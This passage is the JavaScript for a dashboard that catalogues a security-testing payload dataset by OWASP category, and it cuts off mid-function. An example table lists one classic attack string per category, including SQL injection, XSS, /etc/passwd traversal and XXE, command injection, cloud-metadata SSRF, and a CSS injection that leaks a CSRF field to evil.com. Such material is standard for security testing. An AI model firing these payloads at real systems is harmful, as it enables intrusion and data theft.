/* ═══════════════════════════════════════════════════════════════
   Veritas Payloads — Cybersecurity Payload Dashboard
   Script (vanilla JS, no dependencies)
   ═══════════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  /* ─── DATA ─── */
  const TOTAL_PAYLOADS = 123918;

  const CATEGORIES = [
    { name: 'Injection (LFI/RFI)', count: 25873 },
    { name: 'Injection (XSS)', count: 12462 },
    { name: 'Injection (Command Injection)', count: 9391 },
    { name: 'Injection (SQLi)', count: 5348 },
    { name: 'Security Misconfiguration', count: 5029 },
    { name: 'Software & Data Integrity Failures (Deserialization)', count: 3766 },
    { name: 'Software Supply Chain Failures (Private Package Confusion)', count: 2220 },
    { name: 'Injection (SSRF)', count: 1354 },
    { name: 'Broken Access Control (IDOR)', count: 1276 },
    { name: 'Identification & Authentication Failures', count: 1099 },
    { name: 'Broken Access Control', count: 1020 },
    { name: 'Cryptographic Failures', count: 1020 },
    { name: 'Cryptographic Failures (Info Disclosure Headers)', count: 1020 },
    { name: 'Cryptographic Failures (JWT Kid Injection)', count: 1020 },
    { name: 'Cryptographic Failures (JWT None Alg)', count: 1020 },
    { name: 'Cryptographic Failures (Weak Crypto Algos)', count: 1020 },
    { name: 'Cryptographic Failures (Weak TLS Probes)', count: 1020 },
    { name: 'HTTP Parameter Pollution', count: 1020 },
    { name: 'HTTP Parameter Pollution (Duplicate Params)', count: 1020 },
    { name: 'Identification & Authentication Failures (Username Enum)', count: 1020 },
    { name: 'Identification & Authentication Failures (Weak Passwords)', count: 1020 },
    { name: 'Identification & Authentication Failures (Weak Session IDs)', count: 1020 },
    { name: 'Injection (CRLF)', count: 1020 },
    { name: 'Injection (CSS Injection)', count: 1020 },
    { name: 'Injection (CSV Injection)', count: 1020 },
    { name: 'Injection (DOM Clobbering)', count: 1020 },
    { name: 'Injection (Format String)', count: 1020 },
    { name: 'Injection (GraphQL)', count: 1020 },
    { name: 'Injection (LDAP)', count: 1020 },
    { name: 'Injection (LaTeX)', count: 1020 },
    { name: 'Injection (NoSQLi)', count: 1020 },
    { name: 'Injection (Open Redirect)', count: 1020 },
    { name: 'Injection (Prototype Pollution)', count: 1020 },
    { name: 'Injection (Request Smuggling)', count: 1020 },
    { name: 'Injection (SMTP)', count: 1020 },
    { name: 'Injection (SSI)', count: 1020 },
    { name: 'Injection (SSTI)', count: 1020 },
    { name: 'Injection (Type Juggling)', count: 1020 },
    { name: 'Injection (Unrestricted File Upload)', count: 1020 },
    { name: 'Injection (XPATH)', count: 1020 },
    { name: 'Injection (XSLT)', count: 1020 },
    { name: 'Injection (XXE)', count: 1020 },
    { name: 'Insecure Design', count: 1020 },
    { name: 'Insecure Design (Coupon Abuse)', count: 1020 },
    { name: 'Insecure Design (Price Manipulation)', count: 1020 },
    { name: 'Insecure Design (Race Condition Tests)', count: 1020 },
    { name: 'Insecure Design (Race Condition)', count: 1020 },
    { name: 'Insecure Design (Rate Limit Bypass)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Debug Code Disclosure)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Error Info Disclosure)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Failing Open / Priv Esc)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Missing Error Page)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Missing/Extra Parameters)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Null/Type/Zero Errors)', count: 1020 },
    { name: 'Mishandling of Exceptional Conditions (Unchecked Exceptions)', count: 1020 },
    { name: 'Security Logging & Monitoring Failures', count: 1020 },
    { name: 'Security Logging & Monitoring Failures (Log Injection)', count: 1020 },
    { name: 'Software Supply Chain Failures', count: 1020 },
    { name: 'Software Supply Chain Failures (Vuln Dependency Versions)', count: 1020 },
    { name: 'Vulnerable & Outdated Components', count: 1020 },
    { name: 'Vulnerable & Outdated Components (CVE Paths)', count: 1020 },
    { name: 'Vulnerable & Outdated Components (Vulnerable Versions)', count: 1020 },
    { name: 'Web Cache Deception', count: 1020 },
    { name: 'Web Cache Deception (Cache Poisoning Headers)', count: 1020 },
    { name: 'Web Cache Deception (Cache Poisoning)', count: 1020 },
  ];

  const SOURCES = [
    { name: 'PayloadsAllTheThings', by: 'Swissky & community', desc: 'Community-driven payload repository covering all major vulnerability categories including XSS, SQLi, LFI, SSRF, SSTI, CMD injection, Open Redirect, NoSQLi, LDAP, Prototype Pollution, and more.', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
    { name: 'SecLists', by: 'Daniel Miessler & Jason Haddix', desc: 'The ultimate collection of security testing wordlists. Extracted: XSS vectors (PortSwigger, OFJAAAH, PayloadBox), LFI paths, SQLi payloads, Commix, format strings, Java classes, and numeric amounts.', url: 'https://github.com/danielmiessler/SecLists' },
    { name: 'Nuclei Templates', by: 'ProjectDiscovery', desc: 'Community-contributed vulnerability templates. Extracted: WAF bypass, CORS misconfig, LFI fuzzing, SSRF proxying, XSS fuzz, SQL injection, CRLF injection, and environment disclosure patterns.', url: 'https://github.com/projectdiscovery/nuclei-templates' },
    { name: 'Exploit Database', by: 'Offensive Security', desc: 'The definitive archive of publicly disclosed exploits. Extracted 9,327 PoC payload strings from 13,605 webapp exploit scripts covering SQLi, XSS, LFI, CMD injection, auth bypass, and more.', url: 'https://gitlab.com/exploit-database/exploitdb' },
    { name: 'OWASP PayloadBox', by: 'PayloadBox', desc: 'XSS vulnerability payload list covering a wide range of injection contexts and filter bypass techniques.', url: 'https://github.com/payload-box/xss-payload-list' },
    { name: 'PortSwigger XSS Cheat Sheet', by: 'PortSwigger Research', desc: 'Cross-site scripting evasion and filter bypass reference. Contains hundreds of tested XSS vectors.', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet' },
    { name: 'Commix', by: 'commixproject', desc: 'Automated command injection testing tool. Extracted 8,262 unique command injection test vectors.', url: 'https://github.com/commixproject/commix' },
    { name: 'sqlmap', by: 'sqlmapproject', desc: 'Automatic SQL injection and database takeover tool. Extracted risk-classified SQLi payloads.', url: 'https://github.com/sqlmapproject/sqlmap' },
    { name: 'LFISuite', by: 'D35m0nd142', desc: 'Local File Inclusion exploitation toolkit providing comprehensive LFI path lists for Linux and Windows targets.', url: 'https://github.com/D35m0nd142/LFISuite' },
    { name: 'fuzzdb', by: 'fuzzdb-project', desc: 'Attack pattern and fuzzing resource database with strings for protocol fuzzing and input validation testing.', url: 'https://github.com/fuzzdb-project/fuzzdb' },
    { name: 'Big List of Naughty Strings', by: 'minimaxir', desc: 'Edge case strings for input validation testing. Helps identify encoding, injection, and boundary-condition issues.', url: 'https://github.com/minimaxir/big-list-of-naughty-strings' },
    { name: 'Cloud & Container References', by: 'AWS, GCP, Azure, DigitalOcean, OpenStack, Kubernetes', desc: 'Cloud metadata endpoints (AWS IMDS, GCP, Azure, Alibaba, DigitalOcean, OpenStack) and container/K8s breakout paths for SSRF and LFI testing.', url: '#' },
  ];

  /* color palette cycled for categories/charts */
  const PALETTE = ['cyan', 'violet', 'green', 'amber', 'pink', 'red'];
  const COLOR_HEX = { cyan: '#22d3ee', violet: '#818cf8', green: '#34d399', amber: '#fbbf24', pink: '#f472b6', red: '#f87171' };

  /* ─── ICONS (inline SVG strings) ─── */
  const ICON = {
    overview: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"/><rect x="14" y="3" width="7" height="5"/><rect x="14" y="12" width="7" height="9"/><rect x="3" y="16" width="7" height="5"/></svg>',
    library: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>',
    sources: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M12 1v6m0 6v6m11-7h-6m-6 0H1"/></svg>',
    walkthrough: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>',
    copy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
    check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
    chevron: '<svg class="acc-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>',
    src: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="2"/><path d="M5 12H2m20 0h-3M12 5V2m0 20v-3"/></svg>',
    target: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
    ext: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>',
    layers: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>',
    grid: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>',
    users: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
    db: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>',
  };

  /* ─── HELPERS ─── */
  const $ = (sel, ctx) => (ctx || document).querySelector(sel);
  const $$ = (sel, ctx) => Array.from((ctx || document).querySelectorAll(sel));
  const fmt = n => n.toLocaleString();
  function escHtml(s) { return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
  function escAttr(s) { return String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c])); }
  function colorFor(i) { return PALETTE[i % PALETTE.length]; }

  /* shared runtime state */
  let globe = null;
  let activeView = 'overview';
  let lastIsMobile = window.innerWidth <= 620;

  /* ─── DERIVED DATA ─── */
  function severityFor(cat) {
    if (/SQLi|Command|LFI|RFI|Deserialization|XXE|SSTI|XSLT/.test(cat)) return { label: 'Critical', cls: 'badge-red' };
    if (/XSS|SSRF|Auth|Open Redirect|NoSQLi|Upload|CRLF|SMTP|Request Smuggling|LaTeX|LDAP/.test(cat)) return { label: 'High', cls: 'badge-amber' };
    if (/Misconfig|IDOR|Prototype|GraphQL|SSI|DOM|CSS|CSV|Format String|Type Juggling|XPATH|HTTP Parameter Pollution/.test(cat)) return { label: 'Medium', cls: 'badge-violet' };
    if (/Cryptographic|Logging|Supply Chain|Outdated|Cache Deception|Mishandling|Insecure Design/.test(cat)) return { label: 'Warning', cls: 'badge-yellow' };
    return { label: 'Info', cls: 'badge-muted' };
  }

  function sourcesForCategory(cat) {
    if (cat.includes('SQLi')) return 'SecLists, sqlmap, Exploit Database';
    if (cat.includes('XSS')) return 'SecLists, PayloadsAllTheThings, OWASP PayloadBox, PortSwigger, Exploit Database';
    if (cat.includes('LFI') || cat.includes('RFI')) return 'SecLists, PayloadsAllTheThings, LFISuite, Exploit Database';
    if (cat.includes('Command')) return 'Commix, SecLists, Exploit Database';
    if (cat.includes('Open Redirect')) return 'PayloadsAllTheThings, Nuclei Templates';
    if (cat.includes('SSRF')) return 'Cloud References, Nuclei Templates, PayloadsAllTheThings';
    if (cat.includes('SSTI')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('XXE')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('NoSQLi')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('Prototype')) return 'PayloadsAllTheThings';
    if (cat.includes('LDAP')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('Misconfig')) return 'SecLists, Nuclei Templates, fuzzdb';
    if (cat.includes('Deserialization')) return 'SecLists (Java classes)';
    if (cat.includes('Auth') || cat.includes('Identification')) return 'SecLists, Exploit Database';
    if (cat.includes('CRLF')) return 'Nuclei Templates, PayloadsAllTheThings';
    if (cat.includes('CSS Injection') || cat.includes('DOM')) return 'PayloadsAllTheThings, PortSwigger';
    if (cat.includes('CSV')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('Format String')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('GraphQL')) return 'PayloadsAllTheThings, Nuclei Templates';
    if (cat.includes('HTTP Parameter')) return 'SecLists, fuzzdb';
    if (cat.includes('LaTeX')) return 'PayloadsAllTheThings';
    if (cat.includes('Request Smuggling')) return 'Nuclei Templates, PortSwigger Research';
    if (cat.includes('SMTP')) return 'PayloadsAllTheThings';
    if (cat.includes('SSI')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('Type Juggling')) return 'SecLists';
    if (cat.includes('Upload')) return 'SecLists, PayloadsAllTheThings, Exploit Database';
    if (cat.includes('XPATH')) return 'SecLists, PayloadsAllTheThings';
    if (cat.includes('XSLT')) return 'PayloadsAllTheThings';
    if (cat.includes('Insecure Design')) return 'PaylodsAllTheThings, Nuclei Templates';
    if (cat.includes('Cryptographic')) return 'SecLists, PayloadsAllTheThings, JWT.io';
    if (cat.includes('IDOR')) return 'PayloadsAllTheThings, PortSwigger';
    if (cat.includes('Broken Access')) return 'PayloadsAllTheThings, Nuclei Templates';
    if (cat.includes('Mishandling')) return 'OWASP, PortSwigger';
    if (cat.includes('Logging')) return 'OWASP, Nuclei Templates';
    if (cat.includes('Supply Chain')) return 'OWASP Dependency-Check, PortSwigger';
    if (cat.includes('Outdated') || cat.includes('Vulnerable')) return 'OWASP Dependency-Check, Nuclei Templates';
    if (cat.includes('Cache Deception')) return 'PortSwigger Research, OWASP';
    return 'PayloadsAllTheThings, SecLists, Exploit Database';
  }

  function descForCategory(cat) {
    if (cat.includes('LFI') || cat.includes('RFI')) return 'File path traversal and inclusion payloads targeting file inclusion vulnerabilities. Includes Linux/Windows absolute paths, traversal sequences, and container breakout paths.';
    if (cat.includes('XSS')) return 'Cross-site scripting vectors for reflected, stored, and DOM-based contexts. Includes polyglots, encoded variants, and filter bypasses.';
    if (cat.includes('Command')) return 'Operating system command injection payloads for Unix and Windows platforms. Includes blind and out-of-band detection techniques.';
    if (cat.includes('SQLi')) return 'SQL injection strings for MySQL, PostgreSQL, MSSQL, Oracle, and SQLite. Covers classic, blind, error-based, and time-based techniques.';
    if (cat.includes('Misconfig')) return 'Security misconfiguration detection strings including default paths, debug endpoints, and information disclosure probes.';
    if (cat.includes('Deserialization')) return 'Java fully-qualified class paths for deserialization attack surface detection on J2EE applications.';
    if (cat.includes('Auth') || cat.includes('Identification')) return 'Authentication bypass payloads including SQL injection auth bypass, default credentials, and session manipulation strings.';
    if (cat.includes('Insecure Design')) return 'Business logic testing payloads including numeric amounts, edge case values, price manipulation, coupon abuse, and race condition patterns.';
    if (cat.includes('Open Redirect')) return 'URL redirect injection payloads for detecting open redirect vulnerabilities. Includes whitelist bypass and protocol manipulation.';
    if (cat.includes('Cryptographic')) return 'Cryptographic weakness detection payloads including JWT attacks, weak keys, TLS configuration probes, and sensitive data exposure.';
    if (cat.includes('IDOR')) return 'Insecure Direct Object Reference test values for enumerating and manipulating object identifiers via numeric, UUID, and base64 patterns.';
    if (cat.includes('Broken Access')) return 'Broken access control probes for horizontal and vertical privilege escalation testing.';
    if (cat.includes('NoSQLi')) return 'NoSQL injection payloads targeting MongoDB and other document databases. Includes operator injection and $where clause attacks.';
    if (cat.includes('LDAP')) return 'Lightweight Directory Access Protocol injection payloads for authentication bypass and information disclosure via LDAP queries.';
    if (cat.includes('SSRF')) return 'Server-side request forgery payloads targeting internal services, cloud metadata endpoints, and port scanning.';
    if (cat.includes('SSTI')) return 'Server-side template injection vectors for Jinja2, Twig, Freemarker, Velocity, Smarty, and other template engines.';
    if (cat.includes('XXE')) return 'XML external entity injection payloads for file disclosure, SSRF, and blind exfiltration via DTD and XInclude attacks.';
    if (cat.includes('Upload') || cat.includes('File Upload')) return 'Unrestricted file upload bypass payloads including dangerous extensions, content-type manipulation, and null byte injection.';
    if (cat.includes('Prototype')) return 'JavaScript prototype pollution payloads targeting __proto__ and constructor.prototype for privilege escalation.';
    if (cat.includes('GraphQL')) return 'GraphQL API security test payloads including introspection queries, field enumeration, and batch/alias attacks.';
    if (cat.includes('SSI')) return 'Server-side includes injection payloads for command execution, file inclusion, and variable disclosure via SSI/ESI directives.';
    if (cat.includes('CRLF')) return 'CRLF / HTTP response splitting payloads for header injection, cache poisoning, and cross-site scripting via line feed injection.';
    if (cat.includes('CSS Injection')) return 'CSS injection payloads for data exfiltration via attribute selectors, font-face loading, and background URL callbacks.';
    if (cat.includes('CSV')) return 'CSV / formula injection payloads for exploiting spreadsheet import functionality with DDE, EXEC, and HTTP callbacks.';
    if (cat.includes('DOM Clobbering')) return 'DOM clobbering payloads exploiting HTML element id/name attributes to override JavaScript variables and API access.';
    if (cat.includes('Format String')) return 'Format string vulnerability probes using %x, %s, %n, and %p specifiers for memory disclosure and arbitrary write.';
    if (cat.includes('HTTP Parameter')) return 'HTTP parameter pollution payloads testing duplicate parameter handling across different platforms and frameworks.';
    if (cat.includes('LaTeX')) return 'LaTeX injection payloads for file read, command execution, and package inclusion via \\input, \\write18, and \\usepackage.';
    if (cat.includes('Request Smuggling')) return 'HTTP request smuggling payloads for CL.TE, TE.CL, and TE.TE desync attacks against web servers and proxies.';
    if (cat.includes('SMTP')) return 'SMTP / email header injection payloads for spamming, phishing, and mail relay abuse via CRLF injection in email headers.';
    if (cat.includes('Type Juggling')) return 'PHP type juggling / loose comparison payloads exploiting magic hashes (0e...) and type coercion for authentication bypass.';
    if (cat.includes('XPATH')) return 'XPATH injection payloads for XML document query manipulation and authentication bypass via boolean injection.';
    if (cat.includes('XSLT')) return 'XSLT transformation injection payloads for server-side file read and remote code execution via XSLT processor extensions.';
    if (cat.includes('Mishandling')) return 'Exceptional condition mishandling test payloads including error disclosure, debug code exposure, and failing-open scenarios.';
    if (cat.includes('Logging')) return 'Security logging and monitoring failure test payloads for log injection, log spoofing, and audit trail manipulation.';
    if (cat.includes('Supply Chain')) return 'Software supply chain vulnerability probes including dependency confusion, private package name squatting, and known vulnerable versions.';
    if (cat.includes('Outdated') || cat.includes('Vulnerable')) return 'Vulnerable and outdated component detection strings including server version banners, actuator endpoints, and CVE-specific probe paths.';
    if (cat.includes('Cache Deception')) return 'Web cache deception payloads for poisoning cached responses via appended static file extensions and cache key manipulation.';
    return cat + ' vulnerability payloads for security testing and vulnerability assessment.';
  }

  function injectionPointFor(cat) {
    if (cat.includes('XXE') || cat.includes('XSLT')) return 'body_xml';
    if (cat.includes('SSRF')) return 'url_parameter';
    if (cat.includes('Upload') || cat.includes('File Upload')) return 'file_upload';
    if (cat.includes('Deserialization')) return 'request_body';
    if (cat.includes('GraphQL') || cat.includes('NoSQLi') || cat.includes('Prototype')) return 'request_body';
    if (cat.includes('CSS') || cat.includes('DOM') || cat.includes('SSI') || cat.includes('CSV')) return 'body_html';
    if (cat.includes('CRLF') || cat.includes('Request Smuggling') || cat.includes('Cache Deception') || cat.includes('Logging')) return 'header';
    if (cat.includes('SMTP') || cat.includes('LDAP') || cat.includes('LaTeX') || cat.includes('Type Juggling') || cat.includes('XPATH') || cat.includes('SSTI') || cat.includes('Format String')) return 'form_parameter';
    if (cat.includes('Auth') || cat.includes('Identification')) return 'form_parameter';
    if (cat.includes('Misconfig') || cat.includes('Outdated') || cat.includes('Vulnerable')) return 'path_parameter';
    return 'query_parameter';
  }

  const EXAMPLES = {
    'SQLi': "' OR '1'='1",
    'XSS': '<script>alert(1)</script>',
    'LFI': '../../../etc/passwd',
    'Command': '; id',
    'Open Redirect': '//evil.com',
    'SSRF': 'http://169.254.169.254/latest/meta-data/',
    'XXE': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    'SSTI': '{{7*7}}',
    'NoSQLi': '{"$gt": ""}',
    'LDAP': '*)(uid=*',
    'Prototype': '{"__proto__": {"admin": true}}',
    'GraphQL': '{__schema{types{name}}}',
    'SSI': '<!--#exec cmd="id"-->',
    'IDOR': '/api/user/1001',
    'Deserialization': 'org.apache.commons.collections.functors.InvokerTransformer',
    'Misconfig': '/.git/config',
    'Upload': 'shell.php%00.jpg',
    'Auth': "admin' --",
    'Broken Access': '/admin/level/99',
    'CRLF': '%0d%0aSet-Cookie: admin=true',
    'CSS Injection': 'input[name="csrf"]{background:url(http://evil.com/leak)}',
    'CSV': '=CMD("id")',
    'DOM Clobbering': '<a id="config" href="http://evil.com">',
    'Format String': '%x.%x.%x.%x',
    'HTTP Parameter': '?user=admin&user=root',
    'LaTeX': '\\immediate\\write18{id}',
    'Request Smuggling': 'Transfer-Encoding: chunked\\r\\nContent-Length: 0',
    'SMTP': 'test@test.com\\r\\nCC: attacker@evil.com',
    'Type Juggling': '0e215962017',
    'XPATH': "' or '1'='1",
    'XSLT': '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="abc:read(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
    'Insecure Design': '?price=-1&quantity=9999',
    'Cryptographic': 'eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.',
    'Mishandling': 'Fatal error: Call to undefined function',
    'Logging': '[ALERT] User admin authenticated',
    'Supply Chain': '@internal/auth-lib',
    'Outdated': 'Server: Apache/2.4.49',
    'Cache Deception': '/api/user/profile.css',
  };
  function exampleFor(cat) {
    for (const k in EXAMPLES) if (cat.includes(k)) return EXAMPLES[k];
    return 'payload_string_example';
  }

  /* build enriched library items */
  const LIBRARY_ITEMS = CATEGORIES.map((cat, i) => {
    const sev = severityFor(cat.name);
    return {
      id: 'OWP-' + String(i + 1).padStart(3, '0'),
      category: cat.name,
      count: cat.count,
      share: cat.count / TOTAL_PAYLOADS,
      description: descForCategory(cat.name),
      source: sourcesForCategory(cat.name),
      contributor: SOURCES[0].by,
      injectionPoint: injectionPointFor(cat.name),
      statusCode: 200,
      severity: sev,
      example: exampleFor(cat.name),
      color: colorFor(i),
    };
  });

  function contributorCount() {
    const set = new Set();
    SOURCES.forEach(s => s.by.split(/[,&]/).forEach(n => { const t = n.trim(); if (t && !/community/i.test(t)) set.add(t); }));
    return set.size;
  }

  /* ─── TOAST ─── */
  let toastTimer;
  function showToast(msg) {
    const wrap = $('#toastWrap');
    if (!wrap) return;
    wrap.innerHTML = '<div class="toast">' + ICON.check + '<span>' + escHtml(msg) + '</span></div>';
    const t = wrap.firstChild;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      t.classList.add('out');
      setTimeout(() => { if (wrap.contains(t)) wrap.removeChild(t); }, 300);
    }, 1800);
  }

  /* ─── COPY ─── */
  function copyText(text) {
    const done = () => showToast('Copied to clipboard');
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
    } else {
      fallbackCopy(text, done);
    }
  }
  function fallbackCopy(text, cb) {
    const ta = document.createElement('textarea');
    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.focus(); ta.select();
    try { document.execCommand('copy'); cb(); } catch (e) { showToast('Copy failed'); }
    document.body.removeChild(ta);
  }
  function copyBtn(text) {
    return '<button class="copy-mini" data-copy="' + escAttr(text) + '" title="Copy" aria-label="Copy">' + ICON.copy + '</button>';
  }

  /* ─── RENDER: SIDEBAR NAV ─── */
  const VIEWS = [
    { id: 'overview', label: 'Overview', title: 'Overview', sub: 'Dataset summary & analytics', count: '' },
    { id: 'library', label: 'Payload Library', title: 'Payload Library', sub: 'Browse & filter payloads', count: fmt(CATEGORIES.length) },
    { id: 'sources', label: 'Sources', title: 'Sources & Contributors', sub: 'Trusted security repositories', count: fmt(SOURCES.length) },
    { id: 'walkthrough', label: 'Walkthrough', title: 'Walkthrough', sub: 'How to use the dataset', count: '' },
  ];

  function renderNav() {
    const nav = $('#sidebarNav');
    const label = nav.querySelector('.nav-section-label');
    nav.innerHTML = '';
    nav.appendChild(label);
    VIEWS.forEach(v => {
      const b = document.createElement('button');
      b.className = 'nav-item' + (v.id === 'overview' ? ' active' : '');
      b.dataset.view = v.id;
      b.innerHTML = ICON[v.id] + '<span>' + v.label + '</span>' + (v.count ? '<span class="nav-count">' + v.count + '</span>' : '');
      b.addEventListener('click', () => setView(v.id));
      nav.appendChild(b);
    });
  }

  /* ─── RENDER: STAT CARDS ─── */
  function renderStats() {
    const grid = $('#statsGrid');
    const cards = [
      { ico: 'db', cls: 'ico-cyan', value: TOTAL_PAYLOADS, desc: 'Total Payloads', trend: 'OWASP' },
      { ico: 'layers', cls: 'ico-violet', value: CATEGORIES.length, desc: 'Vulnerability Categories', trend: 'Top 10' },
      { ico: 'users', cls: 'ico-green', value: contributorCount(), desc: 'Contributors', trend: 'Community' },
      { ico: 'grid', cls: 'ico-amber', value: SOURCES.length, desc: 'Sources & Repositories', trend: 'Curated' },
    ];
    grid.innerHTML = cards.map(c => (
      '<div class="stat-card">' +
        '<div class="stat-card-top">' +
          '<div class="stat-ico ' + c.cls + '">' + ICON[c.ico] + '</div>' +
          '<span class="stat-trend">' + c.trend + '</span>' +
        '</div>' +
        '<div class="stat-value" data-target="' + c.value + '">0</div>' +
        '<div class="stat-desc">' + c.desc + '</div>' +
      '</div>'
    )).join('');
  }

  /* ─── RENDER: BAR CHART ─── */
  function renderBarChart() {
    const el = $('#barChart');
    const top = CATEGORIES.slice(0, 6);
    const max = top[0].count;
    el.innerHTML = top.map(c => (
      '<div class="bar-item">' +
        '<div class="bar-top"><span class="bar-name">' + escHtml(c.name) + '</span><span class="bar-val">' + fmt(c.count) + '</span></div>' +
        '<div class="bar-track"><div class="bar-fill" data-w="' + (c.count / max * 100) + '"></div></div>' +
      '</div>'
    )).join('');
  }

  function animateBars() {
    $$('#barChart .bar-fill').forEach(f => { f.style.width = f.dataset.w + '%'; });
  }

  /* ─── RENDER: DONUT ─── */
  function renderDonut() {
    const donut = $('#donut');
    const legend = $('#donutLegend');
    const top = CATEGORIES.slice(0, 5);
    const topSum = top.reduce((a, c) => a + c.count, 0);
    const other = TOTAL_PAYLOADS - topSum;
    const segments = top.map((c, i) => ({ name: c.name, count: c.count, color: COLOR_HEX[colorFor(i)] }));
    segments.push({ name: 'Other categories', count: other, color: '#33405a' });

    let acc = 0;
    const stops = segments.map(s => {
      const start = acc / TOTAL_PAYLOADS * 100;
      acc += s.count;
      const end = acc / TOTAL_PAYLOADS * 100;
      return s.color + ' ' + start.toFixed(2) + '% ' + end.toFixed(2) + '%';
    }).join(', ');
    donut.style.background = 'conic-gradient(' + stops + ')';

    const center = donut.querySelector('.d-num');
    if (center) center.textContent = (TOTAL_PAYLOADS / 1000).toFixed(1) + 'K';

    legend.innerHTML = segments.map(s => (
      '<div class="legend-item"><span class="legend-dot" style="background:' + s.color + '"></span>' +
      '<span>' + escHtml(shorten(s.name)) + '</span>' +
      '<span class="l-val">' + (s.count / TOTAL_PAYLOADS * 100).toFixed(1) + '%</span></div>'
    )).join('');
  }
  function shorten(n) { return n.replace('Injection ', '').replace('Software & Data Integrity Failures ', ''); }

  /* ─── RENDER: CATEGORY LIST ─── */
  function renderCatList() {
    const el = $('#catList');
    el.innerHTML = CATEGORIES.map((c, i) => (
      '<div class="cat-chip" data-cat="' + escAttr(c.name) + '">' +
        '<span class="c-dot" style="background:' + COLOR_HEX[colorFor(i)] + '"></span>' +
        '<span class="c-name">' + escHtml(c.name) + '</span>' +
        '<span class="c-count">' + fmt(c.count) + '</span>' +
      '</div>'
    )).join('');
    $$('#catList .cat-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        const cat = chip.dataset.cat;
        $('#filterCategory').value = cat;
        setView('library');
        applyFilters();
